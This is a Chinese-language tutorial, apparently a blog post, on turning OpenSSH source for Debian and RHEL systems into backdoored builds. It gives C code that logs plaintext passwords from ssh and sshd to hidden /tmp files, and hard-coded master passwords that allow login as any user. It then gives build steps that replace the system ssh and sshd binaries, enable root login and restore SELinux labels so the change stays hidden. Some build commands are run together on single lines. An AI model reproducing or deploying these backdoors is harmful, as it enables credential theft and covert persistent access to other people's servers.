# OpenSSH后门制作

网上关于OpenSSH的后门都是抄来抄去，普遍都是对某个早期版本的OpenSSH打patch进行的，这样的后门使用起来就是自己骗自己，隐蔽性不强，兼容度也极低。因此，花了一段时间研究怎么手工制作OpenSSH后门，这样的后门定制度高，与服务器上OpenSSH版本一致，隐蔽性也较强。

本教程主要记录怎么制作硬编码口令后门及密钥窃听后门，实际上使用OpenSSH源码编译后门能做的还有很多，如硬编码免密后门、命令执行、攻击痕迹清理等。

## Debian系-OpenSSH后门

### 确定版本

```shell
dpkg -S /usr/sbin/sshd
dpkg -l openssh-server
## apt-get download openssh-server=1:8.4p1-5
```

### 下载源码

```shell
# 这是Debian版的下载地址。
https://tracker.debian.org/pkg/openssh
https://salsa.debian.org/ssh-team/openssh/-/archive/debian/1%258.4p1-5/openssh-debian-1%258.4p1-5.zip
# 这是Ubuntu版的下载地址。
https://launchpad.net/ubuntu/+source/openssh
https://launchpad.net/ubuntu/+source/openssh/1:8.4p1-5ubuntu1
```

### 添加后门代码

下面给出发现的一些可利用的位置，实战中使用基本足矣。

```shell
[ssh]
readpass.c     ... read_passphrase
sshconnect2.c  ... userauth_passwd

[sshd]
monitor.c      ... mm_answer_authpassword
auth-passwd.c  ... auth_password
auth-pam.c     ... sshpam_auth_passwd   //大多数ssh都默认使用pam进行认证
```

具体的添加步骤，这里给出几个简单例子。

#### 偷密码

```c
// sshconnect2.c:userauth_passwd      ssh（偷连向其他服务器的密码）
FILE *fp = NULL;
fp = fopen("/tmp/.ssh-2AKMo5YJSRPJ", "a+");
fprintf(fp, "{\"%s@%s\":\"%s\"} (%s:%s)\n",authctxt->server_user,authctxt->host,password,authctxt->local_user,authctxt->service);
fclose(fp);

// auth-passwd.c:auth_password        sshd（记录本机接收到的密码）
// 如果添加在具体的认证函数之前可获得所有登录尝试下的密码，用于口令分析
// 如果添加在认证通过后就是专门用于偷口令的OpenSSH口令窃取后门
FILE *fp = NULL;
time_t timep;
struct tm * lt;
time (&timep);
lt=localtime(&timep);
fp = fopen("/tmp/.sshd_listener.log", "a+");
fprintf(fp, "[%ld/%d/%d %d:%d:%d] [%d] %s:%d --> %s:%d { \"%s\" : \"%s\" }\n", \
		//asctime(gmtime(&timep)), 
		lt->tm_year+1900,lt->tm_mon+1,lt->tm_mday,lt->tm_hour,lt->tm_min,lt->tm_sec,\
		timep, \
		ssh->remote_ipaddr, \
		ssh->remote_port,\
		ssh->local_ipaddr, \
		ssh->local_port,\
		authctxt->user,password);
fclose(fp);
```

#### 万能口令

使用硬编码的万能口令能登录任意用户。

```c
// auth-passwd.c:auth_password        sshd
if (!strcmp(password, "testme12#$")) return 1;

// monitor.c:mm_answer_authpassword   sshd
原来代码如下：authenticated = options.password_authentication && auth_password(ssh, passwd);
改为：authenticated = options.password_authentication && auth_password(ssh, passwd) || strcmp(passwd, "laotie666")==0;
```

### 编译安装

```shell
apt-get install libpam0g-dev libselinux1-dev

clear;rm -rf /usr/local/share/man/man5/authorized_keys.5;rm -rf ~/.ssh;make clean; ./configure --with-zlib --with-ssl-dir --with-pam --bindir=/usr/bin --sbindir=/usr/sbin --sysconfdir=/etc/ssh --with-md5-passwords --with-selinux --with-privsep-path=/run/sshd ; make && make install 

clear;rm -rf /usr/local/share/man/man5/authorized_keys.5;rm -rf ~/.ssh;make clean; ./configure --with-zlib --with-ssl-dir --with-pam --bindir=/usr/bin --sbindir=/usr/sbin --sysconfdir=/etc/ssh --with-md5-passwords --with-selinux --with-privsep-path=/var/lib/sshd/ ; make && make install  
# 实际上源码编译并安装后会发现ssh和sshd都替换掉了。因为我们的源码包是openssh的，不单纯是openssh-server
```

### 效果

下图中可以看到Debian上使用带窃听功能的ssh后门尝试登录服务器时，记录到的密码。

![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/2021-07-06_173536.jpg)

下图是其他设备尝试以万能口令登录Debian服务器的效果。

![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/2021-07-06_175822.jpg)

Debian服务器上带窃听后门代码的sshd上也可以看到输入的密码信息。

![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/2021-07-06_175916.jpg)

## RHEL系-OpenSSH后门

### 确定版本

```shell
rpm -qf /usr/sbin/sshd
```

### 下载源码

```shell
https://cloudflare.cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/
https://cloudflare.cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-7.8p1.tar.gz
https://cloudflare.cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-7.8p1.tar.gz.asc
```

### 添加后门代码

参考上面Debian系的添加方法，都是一样的。

### 编译安装

**step1** 源码编译

```shell
yum -y install pam-devel libselinux-devel zlib zlib-devel openssl-devel openssl-libs make gccwget http://vault.centos.org/8.4.2105/BaseOS/Source/SPackages/openssh-8.0p1-6.el8_4.2.src.rpmrpm -i openssh-8.0p1-6.el8_4.2.src.rpmcd ~/rpmbuild# 编译选项可查看./contrib/redhat/openssh.specclear;rm -rf /usr/local/share/man/man5/authorized_keys.5;rm -rf ~/.ssh /etc/ssh ;make clean; ./configure --with-zlib --with-ssl-dir --with-pam --bindir=/usr/bin --sbindir=/usr/sbin --sysconfdir=/etc/ssh --with-md5-passwords --with-selinux --with-privsep-path=/run/sshd ; make && make install 
```

**step2** 编写sshd.service文件

```shell
cat /etc/systemd/system/sshd.service <<EOF[Unit]Description=OpenSSH server daemonAfter=network.target[Service]Type=simpleUser=rootRestart=on-failureRestartSec=5sExecStart=/usr/sbin/sshd -f /etc/ssh/sshd_configKillMode=process[Install]WantedBy=multi-user.targetEOF
```

**step3** 编辑sshd_config配置文件，允许root登录

```shell
sed -i '/^PermitRootLogin/ s/no/yes/' /etc/ssh/sshd_config
```

**step4** 解决SELinux安全检查问题

```shell
restorecon -rv /usr/sbin/
```

**step5** 启动sshd.service

```shell
systemctl enable sshd.servicesystemctl start sshd.service
```

### 效果

下图时CentOS服务器带窃听功能的ssh及sshd捕获到的密码信息。

![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/2021-07-06_153441.jpg)

